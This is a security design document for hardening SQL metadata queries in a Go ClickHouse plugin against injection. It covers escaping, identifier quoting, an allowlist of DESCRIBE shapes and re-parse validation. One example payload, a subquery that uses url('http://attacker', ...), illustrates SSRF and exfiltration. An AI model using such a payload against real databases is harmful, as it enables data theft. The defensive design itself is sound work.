## Context

Two metadata lookups in `pkg/plugin/metadata.go` build SQL by string-formatting user-derived names:

- `QueryPK` (`:120-132`) → `fmt.Sprintf(PrimaryKeyQuery, database, table)` where `PrimaryKeyQuery = "... WHERE database='%s' AND table ='%s'"` (`:22`). Here `database`/`table` are **string literals** — a `'` in the name breaks out. They come from `tableVisitor` AST nodes (`cte.go:93-105`), so a backtick-quoted source identifier such as `` `x'y` `` can legitimately contain a quote.
- `QueryKeys` (`:134-164`) → `fmt.Sprintf("DESCRIBE %s", cte)` (`AdHocKeyQuery`, `:25`). Here the value is an **identifier / table expression**. The only guard is `if strings.Contains(strings.ToUpper(cte), "SELECT") { cte = "(" + cte + ")" }` — a naive heuristic. The value has two sources: `c.CTE = expr.From.Expr.String()` (AST-reserialized FROM expression, `cte.go:120`) and the **raw** `params[0]` from `$__adHocFilter(<arg>)` (`macros_adhoc.go:80-82`), which never passes through the AST.

`escape()` (`macros_adhoc.go:43-65`) neutralizes single-quoted **literals** only. No identifier-quoting helper exists. `executeQuery` (`:170`) ships a single `rawSql` string into `QueryData` — there is no bound-parameter channel today.

**Dependency:** this change builds on `upgrade-sql-parser` (clickhouse-sql-parser v0.5.2). The D4 re-parse/shape check relies on v0.5.x's broadened `DESCRIBE` grammar (accepts subqueries and table functions), which v0.3.0 cannot parse. AST serialization here uses `parser.Format(node)` (the removed `Expr.String()`), consistent with that upgrade.

## Goals / Non-Goals

**Goals:**
- `QueryPK` emits `database`/`table` as safe single-quoted literals.
- `QueryKeys` emits a `DESCRIBE` target that is either a quoted identifier (real table) or a validated subquery — never a raw, unbalanced, or table-function string.
- The `params[0]` explicit argument is a strict identifier before it can drive a metadata query.
- Honest queries produce identical results (existing `MetadataProvider` scenarios keep passing).

**Non-Goals:**
- Ad-hoc filter operator/map-key hardening — owned by `close-adhoc-filter-injection`.
- Introducing a bound-parameter transport into `executeQuery` (see D1 trade-off); escaping closes the literal vector without new plumbing.
- Changing the TTL cache, OAuth-keyed pooling, or header propagation behavior.

## Decisions

**D1 — Escape PK literals rather than parameterize.** `database`/`table` are literals; route both through `escape()` before `fmt.Sprintf`. Rationale: the fix must be minimal and match existing infrastructure; `executeQuery` only carries a `rawSql` string, so bound parameters would require new request plumbing across the sqlds path for no additional safety on a pure-literal sink.
- _Alternative considered:_ thread `params []any` through `executeQuery`/`QueryData`. Rejected for scope — larger surface, and escaping fully closes a literal position. Left as a future hardening note.

**D2 — Add `quoteIdentifier`.** New helper that wraps an identifier in backticks. Rationale: identifiers are a distinct grammar from literals; `escape()` is the wrong tool for the `DESCRIBE` target. Placed in the Go backend for reuse by both metadata and (optionally) the ad-hoc map-key path.
- _Implementation finding:_ the clickhouse-sql-parser lexer does not unescape bytes inside backtick identifiers — it reads until the first backtick — so an embedded backtick cannot round-trip and is **rejected** rather than escaped (NUL likewise). This is safe in practice: a parser-derived identifier name can never contain a backtick (the lexer would have stopped there), so the rejection path is unreachable for legitimate input and exists purely as a defensive guard.

**D3 — `QueryKeys` builds from validated shapes, allowlist not blocklist.** Determine the target from the parsed AST rather than a string heuristic:
- Real table (`db.table` / `table`): emit `` DESCRIBE TABLE `db`.`tbl` `` from the AST identifier nodes via `quoteIdentifier`.
- Genuine subquery: wrap and re-parse (D4).
- Anything else (table functions like `url`/`remote`/`s3`/`file`, JOINs, arbitrary FROM): **reject** with a typed error.
Rationale: parentheses are a grammar convenience, not a security boundary — a balanced `(SELECT * FROM url('http://attacker', ...))` is still SSRF/exfiltration. Failing closed on unrecognized shapes is the only sound default.
- _Scope note (deferred):_ a bare WITH-alias reference in FROM is classified as a table identifier and emitted as a quoted identifier (which then errors at ClickHouse, as it did before this change) — it is **not** expanded to the CTE's subquery. Doing so requires plumbing the full query AST into the metadata layer and is tracked as separate follow-up (`resolve-adhoc-with-cte`). This carries no injection risk: the alias only ever reaches SQL as a validated backtick-quoted identifier.
- _Alternative considered:_ keep "wrap in parens" for non-table forms. Rejected — does not neutralize `)`/comments/`;`, and legitimizes table functions; discussed at length with the reviewer.

**D4 — Subquery path is backed by a re-parse/shape check.** When a genuine subquery must be described, assemble the `DESCRIBE (...)` and re-parse it, asserting exactly one `parser.DescribeStmt` whose `Target` is a subquery; reject on parse failure or shape mismatch. Rationale: verification, not string trust, is what makes the parenthesized case safe. This depends on `upgrade-sql-parser` — v0.5.x's `DescribeStmt` and broadened `DESCRIBE` grammar are what make this re-parse possible; on v0.3.0 the assembled statement would not parse.

**D5 — Strict identifier check on `params[0]`.** The explicit `$__adHocFilter(<arg>)` argument SHALL match a strict identifier pattern (optionally `db.table`) before use; reject otherwise. Rationale: this source bypasses the AST entirely, so it needs its own gate rather than inheriting AST guarantees.

## Risks / Trade-offs

- **[Escaping is skipped because bound params felt "more correct"]** → Decision recorded (D1); PK literal escaping is asserted by a test injecting a `'` in the table name. Proving signal: unit test asserting the generated SQL keeps the quote inside the literal.
- **[A legitimate CTE/table shape is now rejected by the allowlist]** → Enumerate the shapes real dashboards use (plain table, `db.table`, named WITH CTE) and add passing tests for each; reject only true table functions / arbitrary expressions. Proving signal: table test over honest shapes returns keys; table-function input returns a typed error.
- **[Re-parse check diverges from what ClickHouse actually executes]** → Use the same `hydrolix/clickhouse-sql-parser` the plugin already parses with, so the shape check matches the interpolation parser. Proving signal: round-trip test parsing the assembled `DESCRIBE (...)`.
- **[`quoteIdentifier` mishandles embedded backticks]** → Round-trip test over identifiers containing backticks, quotes, and unicode. Proving signal: unit test asserting quote+unquote recovers the input.
